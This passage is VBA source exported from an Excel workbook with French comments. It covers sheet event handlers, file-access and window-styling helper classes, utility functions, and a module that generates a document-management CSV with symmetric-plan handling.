    If ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value <> "O" Then GoTo Fin 'Analyse dynamique d|fffd|valid|fffd|e
    
    If ThisWorkbook.Sheets(ShAffaire).Range("Champ_Suivi_Modifications").Value = "O" Then Sauvegarde_historique Target 'Sauvegarde automatique des modifications activ|fffd|e
    
    Mise_A_Jour_Date_Modification Me, Target.row 'On impose le format Date dans les colonnes devant recevoir une date
    'Controle_Format_Cellule ThisWorkbook.Worksheets(shDecoupage), Target.Row, Target.Column
    Controle_Format_Ligne ThisWorkbook.Worksheets(shDecoupage), Target.row
     
Fin:
    Application.EnableEvents = True
    On Error GoTo 0
End Sub


Sub Sauvegarde_historique(Target As Range)
    Dim Ligne As Long

    Ligne = SheetCls.LastLineColumn(ThisWorkbook.Sheets(ShAffaire), 16) + 1
    If Ligne < 30 Then Ligne = 29
    If Ligne < ThisWorkbook.Sheets(ShAffaire).Rows.Count Then
        With ThisWorkbook.Sheets(ShAffaire)
            .Cells(29, 15).Value = Ligne
            .Cells(Ligne, 16).Value = CStr(VBA.Date)
            .Cells(Ligne, 17).Value = shDecoupage
            .Cells(Ligne, 18).Value = ThisWorkbook.Sheets(shDecoupage).Cells(Target.row, 1).Value
            .Cells(Ligne, 19).Value = Target.row
            .Cells(Ligne, 20).Value = Target.Column
            If Target.Count <> 1 Then
                .Cells(Ligne, 21).Value = VBA.Str(Target.Count) + " Modif multiples"
            Else
                .Cells(Ligne, 21).Value = Target.Value
            End If
        End With
    End If
End Sub

Attribute VB_Name = "Feuil2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

Attribute VB_Name = "Feuil3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil4"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "CB_2, 19, 0, MSForms, CommandButton"
Attribute VB_Control = "CB_0, 20, 1, MSForms, CommandButton"
Attribute VB_Control = "CB_1, 21, 2, MSForms, CommandButton"
Attribute VB_Control = "CB_3, 22, 3, MSForms, CommandButton"
Attribute VB_Control = "imgCtrlKO, 23, 4, MSForms, Image"
Attribute VB_Control = "imgCtrlGenOK, 24, 5, MSForms, Image"
Attribute VB_Control = "imgGenFicOK, 25, 6, MSForms, Image"
Attribute VB_Control = "imgCtrlGenKO, 26, 7, MSForms, Image"
Attribute VB_Control = "imgCtrlOK, 27, 8, MSForms, Image"
Attribute VB_Control = "imgGenFicKO, 28, 9, MSForms, Image"
Attribute VB_Control = "imgLectureOK, 34, 10, MSForms, Image"
Attribute VB_Control = "imgLectureKO, 35, 11, MSForms, Image"
Private Sub CB_0_Click()
    Traitement_CB_0
End Sub

Private Sub CB_1_Click()
    AuTravail False
End Sub

Private Sub CB_2_Click()
    AuTravail True
End Sub

Private Sub CB_3_Click()
    cmdGenererFichiers
End Sub

Private Sub Worksheet_Activate()
    With Worksheets(shListeDeFID)
        .imgLectureOK.Visible = False
        .imgLectureKO.Visible = True
        .imgCtrlOK.Visible = False
        .imgCtrlKO.Visible = True
        .imgCtrlGenOK.Visible = False
        .imgCtrlGenKO.Visible = True
        .imgGenFicOK.Visible = False
        .imgGenFicKO.Visible = True
    End With
End Sub

Attribute VB_Name = "Feuil8"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil9"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "FilesClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.3 du 17/10/2008
'[---------------------------------------------------------------------------
'[Sujet: Classe de Gestion d'acc|fffd|s aux Fichiers
'[---------------------------------------------------------------------------

Option Explicit

'Application.FindFile

'Fonction affichant une boite de dialogue permettant |fffd| l'utilisateur de fixer le chemin et le nom du fichier qu'il veut ouvrir
Function Openfiles(thePath As String, TypesFiles As String, theTitle As String, newPath As String, nameFile As String) As Boolean
    Dim Reponse As Variant
    Dim pathComplet     As String
    
    'Essai d'acces au repertoire
    FilesCls.CheckAccesDirectory thePath
    
    'Simulation d'ouverture
    Reponse = Application.GetOpenFilename(fileFilter:=TypesFiles, Title:=theTitle)
    
    'Si arr|fffd|t est demand|fffd|
    If Reponse = False Then Exit Function
    
    'Sinon
    pathComplet = Reponse
    
    'Obtention du chemin et du nom du fichier
    FilesCls.SepareNameFileAndPath pathComplet, newPath, nameFile
    
    Openfiles = True
End Function


'Sub ChoixFichierAOuvrir()
'    Dim Ret As Variant
'    Dim F   As Integer
'
'    ChDir "C:\"
'    ChDir "C:\Ton R|fffd|pertoire par D|fffd|faut"
'    Ret = Application.GetOpenFilename("Fichier Excel (*.xls), *.xls", , "S|fffd|lectionnez un ou plusieurs fichiers", , True)
'
'    If VarType(Ret) = vbBoolean Then
'        Exit Sub 'Bouton Cancel
'    Else
'        For F = 1 To UBound(Ret)
'            MsgBox Ret(F)
'        Next
'    End If
'End Sub


'Fonction affichant une boite de dialogue permettant |fffd| l'utilisateur de fixer le chemin et le nom du fichier qu'il veut enregistrer
Function SaveFiles(thePath As String, TypesFiles As String, theTitle As String, newPath As String, nameFile As String) As Boolean
    Dim Reponse         As Variant
    Dim pathComplet     As String
   
    'Essai d'acces au repertoire
    FilesCls.CheckAccesDirectory thePath
    
    'Simulation d'ouverture
    Reponse = Application.GetSaveAsFilename(InitialFileName:=nameFile, fileFilter:=TypesFiles, Title:=theTitle)
    
    'Si arr|fffd|t est demand|fffd|
    If Reponse = False Then Exit Function
    
    'Sinon, caste
    pathComplet = Reponse
    
    'Obtention du chemin et du nom du fichier
    FilesCls.SepareNameFileAndPath pathComplet, newPath, nameFile
    
    SaveFiles = True
End Function


'Fonction renvoyant vrai si le fichier existe dans le r|fffd|pertoire indiqu|fffd|
Function ExistFileInDir(pathDirectory As String, theFile As String) As Boolean

    'Controle de l'acc|fffd|s au directory
    FilesCls.CheckAccesDirectory pathDirectory
    
    'V|fffd|rif de l'existance du fichier
    If VBA.Len(VBA.Dir(theFile)) > 0 Then
        ExistFileInDir = True
    End If
End Function


'Sub v|fffd|rifiant l'acc|fffd|s |fffd| un repertoire
Function CheckAccesDirectory(pathDirectory As String) As Boolean
    CheckAccesDirectory = True
    
    'Essai acc|fffd|s |fffd| l'unit|fffd|
    On Error Resume Next
        ChDrive FilesCls.LetterDirBook(pathDirectory)
        If err.Number <> 0 Then err = 0
    On Error GoTo 0

    'Essai acc|fffd|s au r|fffd|pertoire
    On Error Resume Next
    VBA.ChDir pathDirectory
    If err > 0 Then
        MsgCls.ShowMessage "MsgAcces", pathDirectory, "MsgForbiden", vbNullString, vbOKOnly + vbCritical
        CheckAccesDirectory = False
    End If
    On Error GoTo 0
End Function


Function Makedir(pathDirectory As String) As Boolean
    Dim x As Integer
    Makedir = True
    On Error Resume Next
    x = VBA.GetAttr(pathDirectory) And 0 'Test si le R|fffd|pertoire Existe
    If err <> 0 Then
        err = 0
        MkDir pathDirectory
        If err > 0 Then
            MsgCls.ShowMessage "MsgAcces", pathDirectory, "MsgForbiden", vbNullString, vbOKOnly + vbCritical
            Makedir = False
        End If
    End If
End Function


'Fonction renvoyant la lettre de l'unit|fffd| d'acces d'un classeur
Function LetterDirBook(thePathWorkBook As String) As String
    LetterDirBook = VBA.Left(thePathWorkBook, 1)
End Function


'Fonction renvoyant le chemin d'acces complet d'un classeur |fffd| partir de ce classeur
Function PathAndNameBookFromBook(theBook As Workbook, withExtension As Boolean) As String
    PathAndNameBookFromBook = PathWorkBook(theBook, True) & WBooksCls.WorkBookName(theBook, withExtension)
End Function


'Fonction renvoyant le chemin d'acces complet d'un classeur |fffd| partir des noms pass|fffd|s en param|fffd|tres
Function PathAndNameBookFromParam(thePath As String, theNameFile As String) As String
    If VBA.Right(thePath, 1) = Application.PathSeparator Then thePath = VBA.Left(thePath, VBA.Len(thePath) - 1)
    PathAndNameBookFromParam = thePath & Application.PathSeparator & theNameFile
End Function


'Fonction renvoyant le chemin d'acces d'un classeur avec ou sans s|fffd|parateur
Function PathWorkBook(theBook As Workbook, withSeparator As Boolean) As String
    PathWorkBook = theBook.path
    If VBA.Right(PathWorkBook, 1) = Application.PathSeparator Then PathWorkBook = VBA.Left(PathWorkBook, VBA.Len(PathWorkBook) - 1)
    If withSeparator Then PathWorkBook = PathWorkBook & Application.PathSeparator
End Function


'Fonction renvoyant le s|fffd|parateur des chemins
Function SeparatorPath() As String
    SeparatorPath = Application.PathSeparator
End Function


'Ajout d'un s|fffd|parateur de r|fffd|pertoire (\) en fin de cha|fffd|ne s'il n'y est pas
Public Function AddPathSeparator(thePath As String) As String
    If VBA.Right(VBA.RTrim(thePath), 1) <> Application.PathSeparator Then
        AddPathSeparator = VBA.RTrim(thePath) & Application.PathSeparator
    End If
End Function


'Sub renvoyant le nom du fichier s|fffd|par|fffd| de son chemin
Sub SepareNameFileAndPath(pathDirectoryComlplet As String, pathDirectory As String, nameFile As String)
    Dim nbSeparateur        As Byte
    Dim posDerSeparateur    As Byte

    'Recherche du nombre de s|fffd|parateur
    nbSeparateur = FunctionsCls.NbOccurenceInText(Application.PathSeparator, pathDirectoryComlplet)
    
    'Obtention de la position du dernier s|fffd|parateur
    posDerSeparateur = FunctionsCls.PosEmeOccurence(Application.PathSeparator, pathDirectoryComlplet, nbSeparateur)
    
    'Obtention du chemin
    If posDerSeparateur > 1 Then pathDirectory = VBA.Left(pathDirectoryComlplet, posDerSeparateur - 1) Else pathDirectory = vbNullString
    
    'Obtention du nom du fichier
    If VBA.Len(pathDirectoryComlplet) > posDerSeparateur Then nameFile = VBA.Right(pathDirectoryComlplet, VBA.Len(pathDirectoryComlplet) - posDerSeparateur) Else nameFile = vbNullString
End Sub


Function FileCopie(SourceFile As String, TargetFile As String, Clear) As Boolean
    FileCopie = False
    If VBA.Len(VBA.Dir(SourceFile)) > 0 Then
        On Error Resume Next
        If Clear And VBA.Len(Dir(TargetFile)) > 0 Then
            VBA.Kill TargetFile
        End If
        
        VBA.FileCopy SourceFile, TargetFile
        If err > 0 Then
            MsgCls.ShowMessage "MsgCopy", SourceFile & vbCrLf & vbCrLf, "MsgTo", TargetFile, vbOKOnly + vbCritical
        Else
            FileCopie = True
        End If
        On Error GoTo 0
    Else
        MsgCls.ShowMessage "MsgCopy", SourceFile & vbCrLf & vbCrLf, "MsgTo", TargetFile, vbOKOnly + vbCritical
    End If
End Function
Attribute VB_Name = "FormClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion du Format des UserForm
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 07/10/2008
'[Version       : V1.2 du 07/10/2008
'[---------------------------------------------------------------------------
'[Sujet: Classe de Gestion du Format des UserForm
'[---------------------------------------------------------------------------

' ===== pour g|fffd|rer la transparence =====
Private Declare Function SetLayeredWindowAttributes Lib "user32.dll" ( _
     ByVal hWnd As Long, _
     ByVal crKey As Long, _
     ByVal bAlpha As Byte, _
     ByVal dwFlags As Long) As Long

Private Declare Function SetWindowLong Lib "user32.dll" Alias "SetWindowLongA" ( _
     ByVal hWnd As Long, _
     ByVal nIndex As Long, _
     ByVal dwNewLong As Long) As Long
     
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long

Private Const WS_CAPTION As Long = &HC00000      'Style to add a titlebar
Private Const WS_SYSMENU As Long = &H80000       'Style to add a system menu
Private Const WS_THICKFRAME As Long = &H40000    'Style to add a sizable frame
Private Const WS_MINIMIZEBOX As Long = &H20000   'Style to add a Minimize box on the title bar
Private Const WS_MAXIMIZEBOX As Long = &H10000   'Style to add a Maximize box to the title bar
Private Const WS_EX_LAYERED As Long = &H80000

Const LWA_ALPHA As Long = &H2
Const GWL_EXSTYLE As Long = -20          'The offset of a window's extended style
Const GWL_STYLE As Long = -16            'The offset of a window's style
  

Public Sub Transparence(handle, Alpha As Long)
    ' ===== cette routine sera appel|fffd|e dans l'UserForm pour g|fffd|rer la transparence =====
    SetWindowLong handle, GWL_EXSTYLE, WS_EX_LAYERED
    SetLayeredWindowAttributes handle, 0, 255 * Alpha / 100, LWA_ALPHA
End Sub


Public Sub FormSizeable(handle)
    ' ===== cette routine sera appel|fffd|e dans l'UserForm pour g|fffd|rer le redimensionnement =====
    Dim lStyle As Long

    'Get the basic window style
    lStyle = GetWindowLong(handle, GWL_STYLE)

    'Build up the basic window style flags for the form
    SetBit lStyle, WS_CAPTION, True
    SetBit lStyle, WS_SYSMENU, True
    SetBit lStyle, WS_THICKFRAME, True
    SetBit lStyle, WS_MINIMIZEBOX, False
    SetBit lStyle, WS_MAXIMIZEBOX, True
    
    'Set the basic window styles
    SetWindowLong handle, GWL_STYLE, lStyle
End Sub

'Procedure to set or clear a bit from a style flag
Private Sub SetBit(ByRef lStyle As Long, ByVal lBit As Long, ByVal bOn As Boolean)
    If bOn Then
        lStyle = lStyle Or lBit
    Else
        lStyle = lStyle And Not lBit
    End If
End Sub
Attribute VB_Name = "FunctionsClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.3 du 01/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Classe Biblioth|fffd|que de Fonctions Diverses
'[---------------------------------------------------------------------------

Option Explicit

'Conversion d'un entier en Cha|fffd|ne et rajoute des caract|fffd|res Z|fffd|ros |fffd| gauche
Function IntToPadString(Num As Variant, l As Long) As String
    Dim Temp As String
    Temp = VBA.Format(Num)
    While VBA.Len(Temp) < l
        Temp = "0" + Temp
    Wend
    IntToPadString = Temp
End Function


'Nombre de fois ou le caract|fffd|re X est contenu dans le texte
Function NbOccurenceInText(charactRef As String, Text As String) As Byte
    Dim newLocate As Byte
    
    'Tant qu'il y aura ...
    While VBA.InStr(newLocate + 1, Text, charactRef) > 0
        newLocate = VBA.InStr(newLocate + 1, Text, charactRef)
        NbOccurenceInText = NbOccurenceInText + 1
    Wend
End Function


'Renvoie la position de la eme occurence
Function PosEmeOccurence(charactRef As String, Text As String, emeOccurence As Byte) As Byte
    Dim bcl As Byte
    
    For bcl = 1 To emeOccurence
        PosEmeOccurence = VBA.InStr(PosEmeOccurence + 1, Text, charactRef)
    Next
End Function


'Renvoie une valeur comprise entre le mini et le maxi
Function Random(withRandomize As Boolean, valRandomize As Integer, valMini As Integer, valMaxi As Integer) As Integer
    'Si l'initialisation du g|fffd|n|fffd|rateur de nombres al|fffd|atoires est demand|fffd|e
    If withRandomize Then Randomize (valRandomize)

    ' Renvoie une valeur al|fffd|atoire comprise entre valMini et valMaxi
    Random = Int((valMaxi * Rnd) + valMini)
End Function


'Indique si la chaine est vide ou plein de caract|fffd|res espaces
Public Function ChaineNonVide(rvVariant) As Integer
    ChaineNonVide = (Len(VBA.Trim$(rvVariant)) > 0)
End Function
Attribute VB_Name = "G_Csv_Documentaire"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion CSV Documentaire
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/07/2008
'[Version       : V1.5 du 17/03/2009
'[---------------------------------------------------------------------------
'[Sujet: Gestion CSV Documentaire, Avec Plans Sym|fffd|triques
'[---------------------------------------------------------------------------


Private Nb_Doc         As Integer

Sub Generation_Csv_Complet()
    Generation_Feuille_Csv
    Generation_Fichier_Csv
    ThisWorkbook.Sheets(shCde_Document).Cells(31, 7).Value = VBA.Date & "-" & VBA.Time
End Sub


Sub Generation_Feuille_Csv()
    Dim i As Integer, Fin_ctrl_ged As Integer
    Dim val_range As String, Mem_ged, Mem_csv As String, Mem_ged_suivant, Fic_csv As String, che_fic As String, che_fic_1 As String, Suf_Doc As String
    Dim Num_Document_Ged As String, lib_csv As String, sacim_csv As String, nom_csv As String, ind_csv As String, form_csv As String
    Dim Ligne_Csv As Long, Nb_max_ctrl_ged As Long
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
    Application.StatusBar = "Purge des donn|fffd|es ant|fffd|rieures ..."
    Purge_Data shCSV
    Application.StatusBar = "D|fffd|but du traitement ..."
    
    Fin_ctrl_ged = 0
    Ligne_Csv = 1
    
    Nb_max_ctrl_ged = Lastline(ThisWorkbook.Worksheets(shCtrl_Ged))
    If Nb_max_ctrl_ged > 9 Then
        val_range = VBA.Trim(VBA.Str(Nb_max_ctrl_ged))
        val_range = "A10:Z" + val_range
        Worksheets(shCtrl_Ged).Range(val_range).Sort _
                Key1:=Worksheets(shCtrl_Ged).Range("P10"), _
                Order1:=xlDescending, _
                Key2:=Worksheets(shCtrl_Ged).Range("E10"), _
                Key3:=Worksheets(shCtrl_Ged).Range("O10")
        Fin = False
        i = 0
        Mem_ged = vbNullString
        ThisWorkbook.Sheets(shCde_Document).Cells(31, 2).Value = VBA.Date & "-" & VBA.Time
    
        While Not Fin
            
            Application.StatusBar = "Traitement de la ligne " & i + 1 & " / " & Nb_max_ctrl_ged - 9 & " en cours ..."
            If ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i, 16) <> Libel_Ok Then
                ' Ligne CTRL_GED non d|fffd|clar|fffd|e dans le TDI : on ne la traite pas
            Else
                ' Ligne CTRL_GED d|fffd|clar|fffd|e dans le TDI : on la traite
                ' recherche du des fichier |fffd| regouper
                Mem_ged = ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i, 5) + "_" + ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i, 6)
                Mem_ged_suivant = ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 5) + "_" + ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 6)
                Mem_csv = ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i, 2)
                Fic_csv = Mem_csv
                Num_Document_Ged = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 5).Value  ' Etude_ref_Dec
                lib_csv = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 17).Value
                sacim_csv = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 18).Value
                nom_csv = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 19).Value
                ind_csv = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 7).Value  ' indice
                form_csv = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 8).Value  ' format
                
                While Mem_ged = Mem_ged_suivant
                    If ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 15) <> ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i, 15) Then
                        Mem_csv = Mem_csv + ":" + ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 2)
                        ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 17) = ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i, 17)
                        ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 19) = ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i, 19)
                    Else
                    
                    End If
                    i = i + 1
                    Mem_ged_suivant = ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 5) + "_" + ThisWorkbook.Sheets(shCtrl_Ged).Cells(10 + i + 1, 6)
                Wend
                Mem_ged = vbNullString
                che_fic = ThisWorkbook.Sheets(shCtrl_Ged).Cells(1, 1).Value
                che_fic = VBA.Mid(che_fic, 10, VBA.Len(che_fic))
                che_fic_1 = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 1).Value
                che_fic = che_fic + VBA.Mid(che_fic_1, 3, VBA.Len(che_fic_1))
                Suf_Doc = ThisWorkbook.Sheets(shCtrl_Ged).Cells(i + 10, 6).Value
                If Suf_Doc = "----" Then Suf_Doc = vbNullString
                Gestion_Plan_Symetrique Ligne_Csv, Num_Document_Ged, Suf_Doc, lib_csv, sacim_csv, nom_csv, che_fic, Mem_csv, ind_csv, form_csv
            End If
            If i + 10 > Nb_max_ctrl_ged Then Fin = True
            i = i + 1
        Wend
        'FichierSortie = Application.GetSaveAsFilename(csv + Date, "Fichiers texte (*.csv),*.csv", , "Indiquer o|fffd| enregistrer le fichier le fichiers CSV")
        Sort_OutputSheet ThisWorkbook.Worksheets(shCtrl_Ged)
        ThisWorkbook.Worksheets(shCSV).Activate
        Range("A1").Select
    End If
    Application.StatusBar = vbNullString
    ' On active tout ce qui doit l'|fffd|tre
    GererConfiguration True
End Sub


'Algorythme de D|fffd|tection des Sym|fffd|triques
'RefMat / Document
'Ref_1 -- vide    Pas Sym|fffd|triques
'Ref_2 -- vide

'Ref_3 -- Ref_3   Pas Sym|fffd|triques
'Ref_4 -- Ref_4

'Ref_5 -- Ref_7   Pas Sym|fffd|triques
'Ref_6 -- Ref_8

'Ref_9 -- vide    R|fffd|f|fffd|rence
'Ref_10-- Ref_9   Sym|fffd|trique

'Ref_11 -- Ref_12 Sym|fffd|trique
'Ref_12 -- vide   R|fffd|f|fffd|rence

'Ref_13 -- Ref_13 R|fffd|f|fffd|rence
'Ref_14 -- Ref_13 Sym|fffd|triques ou
'Ref_15 -- Ref_13 Plans Tableaux

'Ref_16 -- Ref_17 R|fffd|f|fffd|rence
'Ref_16 -- Ref_17 Sym|fffd|triques ou
'Ref_16 -- Ref_17 Plans Tableaux


'Pour chaque ligne OK de CTRL_GED, on lance la proc|fffd|dure ci-apres
'Pour les pieces symetriques, on documente la r|fffd|f|fffd|rence dans la colonne Document de Materiel
'Version avec chargement d'un fichier Texte pour les plans sym|fffd|triques et documentation du Champ Observation de Sap et de la GED
Sub Gestion_Plan_Symetrique(Ligne_Csv As Long, Num_Document_Ged As String, Suffixe_Ged As String, Libelle_Ged As String, Sacim_Ged As String, NomFour_Ged As String, _
                            Chemin_Ged As String, Fichiers_Ged As String, Indice_Ged As String, Format_Ged As String)
    Dim Rech As Object
    Dim FirstAddress As String, RefFour_Mat As String, Suffixe_Mat As String, Libelle_Mat As String, ObservRef As String, ObservSym As String, ObservSym2 As String, Fichiers_Sym As String, MsgConsult As String
    Dim Ligne_Ref As Long
    Dim Mem_Ecriture As Boolean
    
    Mem_Ecriture = False
    Ligne_Ref = 0
    
    'Recherche dans l'onglet Mat|fffd|riel
    With ThisWorkbook.Worksheets(shMateriels)
        
        'Trouver la R|fffd|f|fffd|rence du Document (colonne Num|fffd|ro de CTRL_GED) dans la colonne R|fffd|f|fffd|rence du Mat|fffd|riel
        Set Rech = .Columns(.Range("MatRefFournisseur").Column).Find(what:=Num_Document_Ged, LookAt:=xlWhole)
        If Not Rech Is Nothing Then
            If .Cells(Rech.row, .Range("MatDocument").Column).Value = vbNullString Or _
                .Cells(Rech.row, .Range("MatDocument").Column).Value = Num_Document_Ged Then
                    Ligne_Ref = Rech.row
            End If

        Else 'Si non Trouv|fffd| en Ref Fournisseur
            Set Rech = .Columns(.Range("MatDocument").Column).Find(what:=Num_Document_Ged, LookAt:=xlWhole)
            If Not Rech Is Nothing Then
                Ligne_Ref = Rech.row 'prendre comme R|fffd|f|fffd|rence le premier Document Trouv|fffd|
            End If
        End If
        
        If Ligne_Ref <> 0 Then
            RefFour_Mat = .Cells(Ligne_Ref, .Range("MatRefFournisseur").Column).Value
            Suffixe_Mat = .Cells(Ligne_Ref, .Range("MatSuffixeReference").Column).Value
            If Suffixe_Mat = "----" Then Suffixe_Mat = vbNullString
        
            If .Cells(Ligne_Ref, .Range("MatNiveau").Column).Value = "S" Then
                'Plan Associ|fffd| |fffd| un Sous-Ensemble et pas d'article portant le N|fffd| du Sous-Ensemble
                If .Cells(Ligne_Ref + 1, .Range("MatRefFournisseur").Column).Value & "_" & _
                     .Cells(Ligne_Ref + 1, .Range("MatSuffixeReference").Column).Value = RefFour_Mat & "_" & Suffixe_Mat Then
                    Ligne_Ref = Ligne_Ref + 1
                End If
            End If
        End If
        
        ObservSym = IniCls.ReadStringIniLangage("MsgFWK", "MsgPlanSym")
        ObservRef = ObservSym & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgPlanRef")
        MsgConsult = IniCls.ReadStringIniLangage("MsgFWK", "MsgConsultSym")

        'Initialisation de la Recherche des Sym|fffd|triques
        'On recherche la colonne Num|fffd|ro de CTRL_GED dans la colonne Document de Materiel
        Set Rech = .Columns(.Range("MatDocument").Column).Find(what:=Num_Document_Ged, LookAt:=xlWhole)
        If Not Rech Is Nothing Then
            'on Doit trouver la R|fffd|f|fffd|rence du Document sur une autre Ligne que la R|fffd|f|fffd|rence du Mat|fffd|riel
            FirstAddress = Rech.Address

            Do 'Article et R|fffd|f|fffd|rence / Suffixe Diff|fffd|rent
                If Rech.row <> Ligne_Ref Then
                    RefFour_Mat = .Cells(Rech.row, .Range("MatRefFournisseur").Column).Value
                    Suffixe_Mat = .Cells(Rech.row, .Range("MatSuffixeReference").Column).Value
                    If Suffixe_Mat = "----" Then Suffixe_Mat = vbNullString
                    Libelle_Mat = .Cells(Rech.row, .Range("MatDesignation").Column).Value

                    If RefFour_Mat & "_" & Suffixe_Mat <> Num_Document_Ged & "_" & Suffixe_Ged Then
                        ObservSym2 = ObservSym & " : " & Num_Document_Ged
                        If Suffixe_Ged <> vbNullString Then ObservSym2 = ObservSym2 & "_" & Suffixe_Ged

                        'Champ Observation de l'onglet Materiel actualis|fffd|, D|fffd|vers|fffd| dans RENOM/SIMON
                        If Ligne_Ref <> 0 Then .Cells(Ligne_Ref, .Range("MatObservation").Column).Value = ObservRef
                        .Cells(Rech.row, .Range("MatObservation").Column).Value = ObservSym2
                        
                        If Not Mem_Ecriture Then 'Article gauche, Ecriture une fois
                            Mem_Ecriture = True
                            Ecriture_CSV Ligne_Csv, Num_Document_Ged, Suffixe_Ged, Libelle_Ged, Sacim_Ged, NomFour_Ged, ObservRef, Chemin_Ged, Fichiers_Ged, Indice_Ged, Format_Ged
                        End If
                        'Ecriture autant de fois que de plans Sym|fffd|triques (Article Droit)
                        Fichiers_Sym = RefFour_Mat & "_" & Suffixe_Mat & "__A4_1_1.txt"
                        If VBA.InStr(1, Fichiers_Sym, "/") Then
                            Fichiers_Sym = Supprime_Slash(Fichiers_Sym)
                        End If
'                        Creation_Fichier_Symetrique Chemin_Ged, Fichiers_Sym, Num_Document_Ged, ObservSym, MsgConsult
'                        Ecriture_CSV Ligne_Csv, RefFour_Mat, Suffixe_Mat, Libelle_Mat, Sacim_Ged, NomFour_Ged, ObservSym2, Chemin_Ged, Fichiers_Sym, Indice_Ged, Format_Ged 'Fichiers_Ged
                        Ecriture_CSV Ligne_Csv, RefFour_Mat, Suffixe_Mat, Libelle_Mat, Sacim_Ged, NomFour_Ged, ObservSym2, Chemin_Ged, Fichiers_Ged, Indice_Ged, Format_Ged 'Fichiers_Sym
                    End If
                End If

                Set Rech = .Columns(.Range("MatDocument").Column).FindNext(Rech)
            Loop While Not Rech Is Nothing And Rech.Address <> FirstAddress
        End If
    End With
        
    If Not Mem_Ecriture Then 'Article sans Sym|fffd|trique
        Ecriture_CSV Ligne_Csv, Num_Document_Ged, Suffixe_Ged, Libelle_Ged, Sacim_Ged, NomFour_Ged, vbNullString, Chemin_Ged, Fichiers_Ged, Indice_Ged, Format_Ged
    End If
End Sub

Function Supprime_Slash(ByVal sNom_Fichier As String) As String
    Dim iPos As Integer
    Dim sChaine As String
    sChaine = sNom_Fichier
    iPos = VBA.InStr(1, sChaine, "/")
    If iPos > 0 Then
        sChaine = VBA.Replace(sChaine, "/", "-")
    End If
    Supprime_Slash = sChaine
End Function

Sub Creation_Fichier_Symetrique(Chemin As String, Filename As String, Plan As String, ObservSym As String, MsgConsult As String)
    Dim FileCtrl    As Long
    
'    On Error GoTo Fin
    On Error Resume Next
    FileCtrl = FreeFile
    Open Chemin & Filename For Output As #FileCtrl
    Print #FileCtrl, ObservSym
